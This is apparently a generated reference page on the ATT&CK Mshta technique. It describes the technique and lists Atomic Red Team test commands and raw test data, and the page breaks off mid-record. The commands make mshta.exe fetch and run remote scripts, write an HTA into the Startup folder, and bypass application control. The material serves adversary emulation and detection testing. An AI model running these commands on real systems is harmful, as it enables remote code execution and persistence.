
# Mshta

## Description

### MITRE Description

> Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Application control', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/005

## Potential Commands

```
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath $env:windir\system32\mshta.exe
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath $env:windir\system32\mshta.exe
Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe
Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}
$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler About -MSHTAFilePath #{mshta_file_path}
Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath #{mshta_file_path}
Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe
Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine JScript -SimulateUserDoubleClick
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}
Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine #{script_engine} -SimulateUserDoubleClick
$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath #{rundll32_file_path}
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe
```

## Commands Dataset

```
[{'command': 'mshta.exe '
             "javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();\n",
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
             '""powershell -noexit -file '
             'PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1"":close")\n',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': '$var =Invoke-WebRequest "#{hta_url}"\n'
             '$var.content|out-file "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1218.005.hta"\n'
             'mshta "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1218.005.hta"\n',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': '$var =Invoke-WebRequest '
             '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"\n'
             '$var.content|out-file "#{temp_file}"\n'
             'mshta "#{temp_file}"\n',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} '
             '-ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement '
             '-MSHTAFilePath #{mshta_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine '
             '#{script_engine} -AsLocalUNCPath -SimulateLateralMovement '
             '-MSHTAFilePath #{mshta_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} '
             '-ScriptEngine #{script_engine} -AsLocalUNCPath '
             '-SimulateLateralMovement -MSHTAFilePath '
             '$env:windir\\system32\\mshta.exe',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} '
             '-ScriptEngine JScript -SimulateUserDoubleClick',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine '
             '#{script_engine} -SimulateUserDoubleClick',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath '
             '$env:windir\\system32\\mshta.exe',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -HTAUri '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta '
             '-MSHTAFilePath #{mshta_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} '
             '-InlineProtocolHandler #{protocol_handler} -UseRundll32 '
             '-Rundll32FilePath $env:windir\\system32\\rundll32.exe',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine JScript '
             '-InlineProtocolHandler #{protocol_handler} -UseRundll32 '
             '-Rundll32FilePath #{rundll32_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} '
             '-InlineProtocolHandler About -UseRundll32 -Rundll32FilePath '
             '#{rundll32_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} '
             '-InlineProtocolHandler #{protocol_handler} -MSHTAFilePath '
             '$env:windir\\system32\\mshta.exe',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine JScript '
             '-InlineProtocolHandler #{protocol_handler} -MSHTAFilePath '
             '#{mshta_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} '
             '-InlineProtocolHandler About -MSHTAFilePath #{mshta_file_path}',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'},
 {'command': 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath '
             '-MSHTAFilePath $env:windir\\system32\\mshta.exe',
  'name': None,
  'source': 'atomics/T1218.005/T1218.005.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Mshta': {'atomic_tests': [{'auto_generated_guid': '1483fab9-4f52-4217-a9ce-daa9d7747cae',
                                                                                    'description': 'Test '
                                                                                                   'execution '
                                                                                                   'of '
                                                                                                   'a '
                                                                                                   'remote '
                                                                                                   'script '
                                                                                                   'using '
                                                                                                   'mshta.exe. '
                                                                                                   'Upon '
                                                                                                   'execution '
                                                                                                   'calc.exe '
                                                                                                   'will '
                                                                                                   'be '
                                                                                                   'launched.\n',
                                                                                    'executor': {'command': 'mshta.exe '
                                                                                                            "javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
                                                                                                 'name': 'command_prompt'},
                                                                                    'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct',
                                                                                                                     'description': 'location '
                                                                                                                                    'of '
                                                                                                                                    'the '
                                                                                                                                    'payload',
                                                                                                                     'type': 'Url'}},
                                                                                    'name': 'Mshta '
                                                                                            'executes '
                                                                                            'JavaScript '
                                                                                            'Scheme '
                                                                                            'Fetch '
                                                                                            'Remote '
                                                                                            'Payload '
                                                                                            'With '
                                                                                            'GetObject',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '906865c3-e05f-4acc-85c4-fbc185455095',
                                                                                    'description': 'Run '
                                                                                                   'a '
                                                                                                   'local '
                                                                                                   'VB '
                                                                                                   'script '
                                                                                                   'to '
                                                                                                   'run '
                                                                                                   'local '
                                                                                                   'user '
                                                                                                   'enumeration '
                                                                                                   'powershell '
                                                                                                   'command.\n'
                                                                                                   'This '
                                                                                                   'attempts '
                                                                                                   'to '
                                                                                                   'emulate '
                                                                                                   'what '
                                                                                                   'FIN7 '
                                                                                                   'does '
                                                                                                   'with '
                                                                                                   'this '
                                                                                                   'technique '
                                                                                                   'which '
                                                                                                   'is '
                                                                                                   'using '
                                                                                                   'mshta.exe '
                                                                                                   'to '
                                                                                                   'execute '
                                                                                                   'VBScript '
                                                                                                   'to '
                                                                                                   'execute '
                                                                                                   'malicious '
                                                                                                   'code '
                                                                                                   'on '
                                                                                                   'victim '
                                                                                                   'systems.\n'
                                                                                                   'Upon '
                                                                                                   'execution, '
                                                                                                   'a '
                                                                                                   'new '
                                                                                                   'PowerShell '
                                                                                                   'windows '
                                                                                                   'will '
                                                                                                   'be '
                                                                                                   'opened '
                                                                                                   'that '
                                                                                                   'displays '
                                                                                                   'user '
                                                                                                   'information.\n',
                                                                                    'executor': {'command': 'mshta '
                                                                                                            'vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                                                                                                            '""powershell '
                                                                                                            '-noexit '
                                                                                                            '-file '
                                                                                                            'PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1"":close")\n',
                                                                                                 'name': 'command_prompt'},
                                                                                    'name': 'Mshta '
                                                                                            'executes '
                                                                                            'VBScript '
                                                                                            'to '
                                                                                            'execute '
                                                                                            'malicious '
                                                                                            'command',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': 'c4b97eeb-5249-4455-a607-59f95485cb45',
                                                                                    'description': 'Execute '
                                                                                                   'an '
                                                                                                   'arbitrary '
                                                                                                   'remote '
                                                                                                   'HTA. '
                                                                                                   'Upon '
                                                                                                   'execution '
                                                                                                   'calc.exe '
                                                                                                   'will '
                                                                                                   'be '
                                                                                                   'launched.\n',
                                                                                    'executor': {'cleanup_command': 'remove-item '
                                                                                                                    '"#{temp_file}" '
                                                                                                                    '-ErrorAction '
                                                                                                                    'Ignore\n',
                                                                                                 'command': '$var '
                                                                                                            '=Invoke-WebRequest '
                                                                                                            '"#{hta_url}"\n'
                                                                                                            '$var.content|out-file '
                                                                                                            '"#{temp_file}"\n'
                                                                                                            'mshta '
                                                                                                            '"#{temp_file}"\n',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'hta_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta',
                                                                                                                    'description': 'URL '
                                                                                                                                   'to '
                                                                                                                                   'HTA '
                                                                                                                                   'file '
                                                                                                                                   'for '
                                                                                                                                   'execution',
                                                                                                                    'type': 'string'},
                                                                                                        'temp_file': {'default': '$env:appdata\\Microsoft\\Windows\\Start '
                                                                                                                                 'Menu\\Programs\\Startup\\T1218.005.hta',
                                                                                                                      'description': 'temp_file '
                                                                                                                                     'location '
                                                                                                                                     'for '
                                                                                                                                     'hta',
                                                                                                                      'type': 'string'}},
                                                                                    'name': 'Mshta '
                                                                                            'Executes '
                                                                                            'Remote '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '(HTA)',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '007e5672-2088-4853-a562-7490ddc19447',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'using '
                                                                                                   'JScript '
                                                                                                   'script '
                                                                                                   'engine '
                                                                                                   'using '
                                                                                                   'local '
                                                                                                   'UNC '
                                                                                                   'path '
                                                                                                   'simulating '
                                                                                                   'lateral '
                                                                                                   'movement.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-HTAFilePath '
                                                                                                            '#{hta_file_path} '
                                                                                                            '-ScriptEngine '
                                                                                                            '#{script_engine} '
                                                                                                            '-AsLocalUNCPath '
                                                                                                            '-SimulateLateralMovement '
                                                                                                            '-MSHTAFilePath '
                                                                                                            '#{mshta_file_path}',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'hta_file_path': {'default': 'Test.hta',
                                                                                                                          'description': 'HTA '
                                                                                                                                         'file '
                                                                                                                                         'name '
                                                                                                                                         'and '
                                                                                                                                         'or '
                                                                                                                                         'path '
                                                                                                                                         'to '
                                                                                                                                         'be '
                                                                                                                                         'used',
                                                                                                                          'type': 'string'},
                                                                                                        'mshta_file_path': {'default': '$env:windir\\system32\\mshta.exe',
                                                                                                                            'description': 'Location '
                                                                                                                                           'of '
                                                                                                                                           'mshta.exe',
                                                                                                                            'type': 'string'},
                                                                                                        'script_engine': {'default': 'JScript',
                                                                                                                          'description': 'Script '
                                                                                                                                         'Engine '
                                                                                                                                         'to '
                                                                                                                                         'use',
                                                                                                                          'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'Jscript '
                                                                                            'Engine '
                                                                                            'over '
                                                                                            'Local '
                                                                                            'UNC '
                                                                                            'Simulating '
                                                                                            'Lateral '
                                                                                            'Movement',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '58a193ec-131b-404e-b1ca-b35cf0b18c33',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'using '
                                                                                                   'JScript '
                                                                                                   'script '
                                                                                                   'engine '
                                                                                                   'simulating '
                                                                                                   'double '
                                                                                                   'click.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-HTAFilePath '
                                                                                                            '#{hta_file_path} '
                                                                                                            '-ScriptEngine '
                                                                                                            '#{script_engine} '
                                                                                                            '-SimulateUserDoubleClick',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'hta_file_path': {'default': 'Test.hta',
                                                                                                                          'description': 'HTA '
                                                                                                                                         'file '
                                                                                                                                         'name '
                                                                                                                                         'and '
                                                                                                                                         'or '
                                                                                                                                         'path '
                                                                                                                                         'to '
                                                                                                                                         'be '
                                                                                                                                         'used',
                                                                                                                          'type': 'string'},
                                                                                                        'script_engine': {'default': 'JScript',
                                                                                                                          'description': 'Script '
                                                                                                                                         'Engine '
                                                                                                                                         'to '
                                                                                                                                         'use',
                                                                                                                          'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'Jscript '
                                                                                            'Engine '
                                                                                            'Simulating '
                                                                                            'Double '
                                                                                            'Click',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': '39ceed55-f653-48ac-bd19-aceceaf525db',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'by '
                                                                                                   'directly '
                                                                                                   'downloading '
                                                                                                   'from '
                                                                                                   'remote '
                                                                                                   'URI.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-HTAUri '
                                                                                                            '#{hta_uri} '
                                                                                                            '-MSHTAFilePath '
                                                                                                            '#{mshta_file_path}',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'hta_uri': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta',
                                                                                                                    'description': 'URI '
                                                                                                                                   'to '
                                                                                                                                   'HTA',
                                                                                                                    'type': 'string'},
                                                                                                        'mshta_file_path': {'default': '$env:windir\\system32\\mshta.exe',
                                                                                                                            'description': 'Location '
                                                                                                                                           'of '
                                                                                                                                           'mshta.exe',
                                                                                                                            'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'Direct '
                                                                                            'download '
                                                                                            'from '
                                                                                            'URI',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': 'e7e3a525-7612-4d68-a5d3-c4649181b8af',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'with '
                                                                                                   'JScript '
                                                                                                   'Engine, '
                                                                                                   'Rundll32 '
                                                                                                   'and '
                                                                                                   'Inline '
                                                                                                   'Protocol '
                                                                                                   'Handler.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-ScriptEngine '
                                                                                                            '#{script_engine} '
                                                                                                            '-InlineProtocolHandler '
                                                                                                            '#{protocol_handler} '
                                                                                                            '-UseRundll32 '
                                                                                                            '-Rundll32FilePath '
                                                                                                            '#{rundll32_file_path}',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'protocol_handler': {'default': 'About',
                                                                                                                             'description': 'Protocol '
                                                                                                                                            'Handler '
                                                                                                                                            'to '
                                                                                                                                            'use',
                                                                                                                             'type': 'string'},
                                                                                                        'rundll32_file_path': {'default': '$env:windir\\system32\\rundll32.exe',
                                                                                                                               'description': 'Location '
                                                                                                                                              'of '
                                                                                                                                              'rundll32.exe',
                                                                                                                               'type': 'string'},
                                                                                                        'script_engine': {'default': 'JScript',
                                                                                                                          'description': 'Script '
                                                                                                                                         'Engine '
                                                                                                                                         'to '
                                                                                                                                         'use',
                                                                                                                          'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'JScript '
                                                                                            'Engine '
                                                                                            'with '
                                                                                            'Rundll32 '
                                                                                            'and '
                                                                                            'Inline '
                                                                                            'Protocol '
                                                                                            'Handler',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': 'd3eaaf6a-cdb1-44a9-9ede-b6c337d0d840',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'with '
                                                                                                   'JScript '
                                                                                                   'Engine '
                                                                                                   'and '
                                                                                                   'Inline '
                                                                                                   'Protocol '
                                                                                                   'Handler.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-ScriptEngine '
                                                                                                            '#{script_engine} '
                                                                                                            '-InlineProtocolHandler '
                                                                                                            '#{protocol_handler} '
                                                                                                            '-MSHTAFilePath '
                                                                                                            '#{mshta_file_path}',
                                                                                                 'name': 'powershell'},
                                                                                    'input_arguments': {'mshta_file_path': {'default': '$env:windir\\system32\\mshta.exe',
                                                                                                                            'description': 'Location '
                                                                                                                                           'of '
                                                                                                                                           'mshta.exe',
                                                                                                                            'type': 'string'},
                                                                                                        'protocol_handler': {'default': 'About',
                                                                                                                             'description': 'Protocol '
                                                                                                                                            'Handler '
                                                                                                                                            'to '
                                                                                                                                            'use',
                                                                                                                             'type': 'string'},
                                                                                                        'script_engine': {'default': 'JScript',
                                                                                                                          'description': 'Script '
                                                                                                                                         'Engine '
                                                                                                                                         'to '
                                                                                                                                         'use',
                                                                                                                          'type': 'string'}},
                                                                                    'name': 'Invoke '
                                                                                            'HTML '
                                                                                            'Application '
                                                                                            '- '
                                                                                            'JScript '
                                                                                            'Engine '
                                                                                            'with '
                                                                                            'Inline '
                                                                                            'Protocol '
                                                                                            'Handler',
                                                                                    'supported_platforms': ['windows']},
                                                                                   {'auto_generated_guid': 'b8a8bdb2-7eae-490d-8251-d5e0295b2362',
                                                                                    'dependencies': [{'description': 'The '
                                                                                                                     'AtomicTestHarnesses '
                                                                                                                     'module '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'installed '
                                                                                                                     'and '
                                                                                                                     'Invoke-ATHHTMLApplication '
                                                                                                                     'must '
                                                                                                                     'be '
                                                                                                                     'exported '
                                                                                                                     'in '
                                                                                                                     'the '
                                                                                                                     'module.',
                                                                                                      'get_prereq_command': 'Install-Module '
                                                                                                                            '-Name '
                                                                                                                            'AtomicTestHarnesses '
                                                                                                                            '-Scope '
                                                                                                                            'CurrentUser '
                                                                                                                            '-Force\n',
                                                                                                      'prereq_command': '$RequiredModule '
                                                                                                                        '= '
                                                                                                                        'Get-Module '
                                                                                                                        '-Name '
                                                                                                                        'AtomicTestHarnesses '
                                                                                                                        '-ListAvailable\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        '$RequiredModule) '
                                                                                                                        '{exit '
                                                                                                                        '1}\n'
                                                                                                                        'if '
                                                                                                                        '(-not '
                                                                                                                        "$RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) "
                                                                                                                        '{exit '
                                                                                                                        '1} '
                                                                                                                        'else '
                                                                                                                        '{exit '
                                                                                                                        '0}'}],
                                                                                    'description': 'Executes '
                                                                                                   'an '
                                                                                                   'HTA '
                                                                                                   'Application '
                                                                                                   'with '
                                                                                                   'Simulate '
                                                                                                   'lateral '
                                                                                                   'movement '
                                                                                                   'over '
                                                                                                   'UNC '
                                                                                                   'Path.',
                                                                                    'executor': {'command': 'Invoke-ATHHTMLApplication '
                                                                                                            '-TemplatePE '
                                                                                                            '-AsLocalUNCPath '
